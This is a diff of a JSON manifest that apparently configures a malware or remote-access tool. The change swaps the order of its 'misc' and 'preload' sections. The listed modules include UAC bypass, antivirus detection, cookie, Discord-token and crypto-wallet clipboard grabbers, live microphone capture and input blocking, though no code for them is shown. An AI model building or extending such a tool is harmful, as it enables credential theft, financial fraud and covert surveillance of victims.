@@ -1,18 +1,8 @@
 {
-    "misc": [
-        ["resources/modules/misc.py", "all"],
-        ["resources/modules/renderer.py", "all"],
-        ["resources/modules/protections.py", "all"],
-        ["resources/modules/uac_bypass.py", "all"],
-        ["resources/modules/info.py", "all"],
-        ["resources/modules/av_detect.py", "all"],
-        ["resources/features/cookie_grabber.py", "engine"],
-        ["resources/features/crypto_clipper.py", "engine"],
-        ["resources/features/discord_grabber.py", "engine"],
-        ["resources/features/live_mic.py", "preload"],
-        ["resources/features/process_management.py", "engine"],
-        ["resources/features/screen_manipulation.py", "engine"],
-        ["resources/features/website_blocker.py", "function"]
+    "preload": [
+        ["resources/features/input_blocker.py", "preload"],
+        ["resources/features/monitor_control.py", "preload"],
+        ["resources/features/process_management.py", "start"]
     ],
     "commands": [
         ["resources/features/audio_control.py", "all"],
@@ -40,9 +30,19 @@
         ["resources/features/.py", "all"],
         ["resources/features/.py", "all"]
     ],
-    "preload": [
-        ["resources/features/input_blocker.py", "preload"],
-        ["resources/features/monitor_control.py", "preload"],
-        ["resources/features/process_management.py", "start"]
+    "misc": [
+        ["resources/modules/misc.py", "all"],
+        ["resources/modules/renderer.py", "all"],
+        ["resources/modules/protections.py", "all"],
+        ["resources/modules/uac_bypass.py", "all"],
+        ["resources/modules/info.py", "all"],
+        ["resources/modules/av_detect.py", "all"],
+        ["resources/features/cookie_grabber.py", "engine"],
+        ["resources/features/crypto_clipper.py", "engine"],
+        ["resources/features/discord_grabber.py", "engine"],
+        ["resources/features/live_mic.py", "preload"],
+        ["resources/features/process_management.py", "engine"],
+        ["resources/features/screen_manipulation.py", "engine"],
+        ["resources/features/website_blocker.py", "function"]
     ]
 }
